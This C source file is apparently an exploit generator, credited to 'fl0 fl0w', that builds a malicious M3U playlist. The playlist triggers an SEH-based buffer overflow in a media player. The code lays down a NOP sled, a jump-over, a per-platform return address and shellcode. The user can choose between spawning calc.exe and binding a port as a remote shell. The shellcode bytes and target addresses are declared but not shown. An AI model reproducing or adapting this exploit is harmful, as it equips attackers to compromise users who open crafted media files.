
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {char* platform; unsigned int addr; } ;
typedef int FILE ;


 int M3Ufile ;
 unsigned int NEXT_SEH ;
 int POST ;
 char* PRE ;
 unsigned int SEH_HANDLER ;
 size_t atoi (char*) ;
 int exit (int ) ;
 int fclose (int *) ;
 int * fopen (int ,char*) ;
 int fprintf (int *,char*,char*,unsigned char*,int ) ;
 unsigned int* jmpover ;
 scalar_t__ malloc (int ) ;
 int memcpy (unsigned char*,unsigned int*,unsigned int) ;
 int memset (unsigned char*,int,int) ;
 int printf (char*,...) ;
 int scanf (char*,int*) ;
 unsigned int* scz ;
 unsigned int* scz2 ;
 unsigned int strlen (unsigned int*) ;
 TYPE_1__* targets ;

int main(int argc, char *argv[])
{ FILE *f;
  unsigned char *buffer;
  unsigned int offset=0;
  int i;
  if(argc < 2){
          printf(" Credits for finding bug go to fl0 fl0w\n");
          printf(" Exploit fl0 fl0w | Special Thanks to Expanders\n\n");
          printf("#   \t Platform\n");
          printf("-----------------------------------------------\n");
          for(i = 0; targets[i].platform; i++)
                printf("%d \t %s\n",i,targets[i].platform);
          printf("-----------------------------------------------\n");
          exit(0);
  }
  printf("{1} Spawn Calc.exe\n");
  printf("{2} Bind port \n");
  unsigned int retaddress=targets[atoi(argv[1])].addr;
    int input;
    scanf("%d",&input);
    switch(input)
    {
                 case 1:
   buffer=(unsigned char*)malloc(SEH_HANDLER+4+strlen(scz)+1+16);
   if((f=fopen(M3Ufile,"wb"))==((void*)0)) { printf("Error ! file not created\n"); exit(0); }

     printf("Building file...\n");
     memset(buffer,0x90,SEH_HANDLER+4+strlen(scz)+1+16);
     offset=NEXT_SEH;

     memcpy(buffer+offset,jmpover,strlen(jmpover));
     offset=SEH_HANDLER;
     memcpy(buffer+offset,&retaddress,4); offset+=4;
     offset+=16;

    memcpy(buffer+offset,scz,strlen(scz));
    offset+=strlen(scz);
    memset(buffer+offset,0x00,1);

                                  fprintf(f,"%s%s%s",PRE,buffer,POST);
                                  printf("File build  :)  \n");
                                  fclose(f);
                 break;

                 case 2:
     buffer=(unsigned char*)malloc(SEH_HANDLER+4+strlen(scz2)+1+16);
     if((f=fopen(M3Ufile,"wb"))==((void*)0)) { printf("Error ! file not created\n"); exit(0); }
     printf("Building file...\n");
     memset(buffer,0x90,SEH_HANDLER+4+strlen(scz2)+1+16);

     offset=NEXT_SEH;
     memcpy(buffer+offset,jmpover,strlen(jmpover));

     offset=SEH_HANDLER;
     memcpy(buffer+offset,&retaddress,4); offset+=4;
     offset+=16;

     memcpy(buffer+offset,scz2,strlen(scz2));
     offset+=strlen(scz2);
     memset(buffer+offset,0x00,1);

                                  fprintf(f,"%s%s%s",PRE,buffer,POST);
                                  printf("File build  :)  \n");
                                  fclose(f);
                 break;
    }
return 0;
  }
